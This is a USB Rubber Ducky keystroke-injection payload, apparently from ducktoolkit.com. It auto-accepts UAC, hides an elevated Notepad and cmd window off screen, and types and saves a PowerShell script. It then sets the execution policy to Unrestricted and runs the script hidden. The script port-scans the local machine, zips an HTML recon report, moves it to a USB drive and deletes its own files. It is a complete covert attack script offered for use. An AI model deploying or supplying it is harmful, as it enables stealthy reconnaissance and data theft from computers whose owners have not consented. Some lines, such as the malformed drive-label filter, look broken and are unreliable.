REM This script is from ducktoolkit.com and will do a portscan of about 20 ports and save on USB that's mounted as 'm:'.
REM         \ \
REM          \ \
REM           \ \
REM            \|\
REM          o.|| \
REM          |||| |
REM         o|||| |
REM       / ||||| |
REM      | |||||\\|
REM      |// /|\ \
REM      o/  /  \ o
REM      / 
REM    +===AND!XOR===+
REM | > Prepare the Hackening < |
LED_R
DELAY 750
GUI r
DELAY 1000
STRING powershell Start-Process notepad -Verb runAs
ENTER
DELAY 750
ALT y
DELAY 750
ENTER
ALT SPACE
DELAY 1000
STRING m
DELAY 1000
DOWNARROW
REPEAT 100
ENTER
STRING $folderDateTime = (get-date).ToString('d-M-y HHmmss')
ENTER
STRING $userDir = (Get-ChildItem env:\userprofile).value + '\Ducky Report ' + $folderDateTime
ENTER
STRING $fileSaveDir = New-Item  ($userDir) -ItemType Directory 
ENTER
STRING $date = get-date 
ENTER
STRING $style = "<style> table td{padding-right: 10px;text-align: left;}#body {padding:50px;font-family: Helvetica; font-size: 12pt; border: 10px solid black;background-color:white;height:100%;overflow:auto;}#left{float:left; background-color:#C0C0C0;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#right{background-color:#C0C0C0;float:right;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#center{background-color:#C0C0C0;width:98%;height:300px;border: 4px solid black;padding:10px;overflow:scroll;margin:10px;} </style>"
ENTER
STRING $Report = ConvertTo-Html -Title 'Recon Report' -Head $style > $fileSaveDir'/ComputerInfo.html' 
ENTER
STRING $Report = $Report + "<div id=body><h1>Duck Tool Kit Report</h1><hr size=2><br><h3> Generated on: $Date </h3><br>" 
ENTER
STRING $Computer = $env:COMPUTERNAME
ENTER
STRING $PortList = 0, 21, 22, 23, 25, 79, 80, 110, 113, 119, 135, 137, 139, 143, 389, 443, 445, 1002, 1024, 1030, 1720, 1900, 5000, 8080
ENTER 
STRING $Report = $Report  + '<div id=right><h3>Port Scan of ' + $Computer + '</h3><table>' 
ENTER 
STRING foreach ($PortNumber in $PortList) { 
ENTER
STRING $PortCheck = New-Object Net.Sockets.TcpClient 
ENTER 
STRING $PortCheck.Connect($Computer, $PortNumber) 
ENTER 
STRING if ($PortCheck.Connected) { 
ENTER
STRING $Report = $Report  +  '<tr><td><b><font color=red>Port ' + $PortNumber + ' is open</font></b></td></tr>'} 
ENTER
STRING else {$Report = $Report  +  '<tr><td>Port ' + $PortNumber + ' is closed</td></tr>'}} 
ENTER
STRING $Report = $Report + '</table></div>' 
ENTER
STRING $Report >> $fileSaveDir'/ComputerInfo.html' 
ENTER
STRING function copy-ToZip($fileSaveDir){ 
ENTER 
STRING $srcdir = $fileSaveDir 
ENTER
STRING $zipFile = $env:temp + '\' + 'Report.zip'
ENTER
STRING if(-not (test-path($zipFile))) { 
ENTER
STRING set-content $zipFile ("PK" + [char]5 + [char]6 + ("$([char]0)" * 18))
ENTER 
STRING (dir $zipFile).IsReadOnly = $false} 
ENTER
STRING $shellApplication = new-object -com shell.application 
ENTER 
STRING $zipPackage = $shellApplication.NameSpace($zipFile) 
ENTER
STRING $files = Get-ChildItem -Path $srcdir 
ENTER 
STRING foreach($file in $files) { 
ENTER
STRING $zipPackage.CopyHere($file.FullName) 
ENTER 
STRING while($zipPackage.Items().Item($file.name) -eq $null){ 
ENTER
STRING Start-sleep -seconds 1 }}} 
ENTER 
STRING copy-ToZip($fileSaveDir) 
ENTER
STRING $usbPresent = 'False' 
ENTER 
STRING do { 
ENTER
STRING $present = Get-WMIObject Win32_Volume | ? { $_.Label -eq  'm:\}' | Measure
ENTER
STRING if ($present.Count -ge 1){ 
ENTER 
STRING $usbPresent = 'True' }Else { 
ENTER
STRING $usbPresent = 'False'}} 
ENTER 
STRING until ($usbPresent -eq 'True') 
ENTER
STRING $driveLetter = Get-WMIObject Win32_Volume | ? { $_.Label -eq  'm:\}' | select Name
ENTER
STRING move-item $env:temp\Report.zip $driveLetter.Name
ENTER
STRING remove-item $fileSaveDir -recurse 
ENTER
STRING Remove-Item $MyINvocation.InvocationName 
ENTER
CTRL s
DELAY 750  
STRING %temp%\config-11one1.ps1
ENTER
DELAY 1000
ALT F4 
DELAY 1000
GUI r 
DELAY 750    
STRING powershell Start-Process cmd -Verb runAs
ENTER
DELAY 750  
ALT y 
DELAY 750  
STRING mode con:cols=14 lines=1 
ENTER
ALT SPACE 
DELAY 750  
STRING m 
DELAY 1000
DOWNARROW 
REPEAT 100
ENTER
STRING powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false 
ENTER 
DELAY 750  
STRING powershell.exe -windowstyle hidden -File $env:temp\config-11one1.ps1
ENTER
LED_G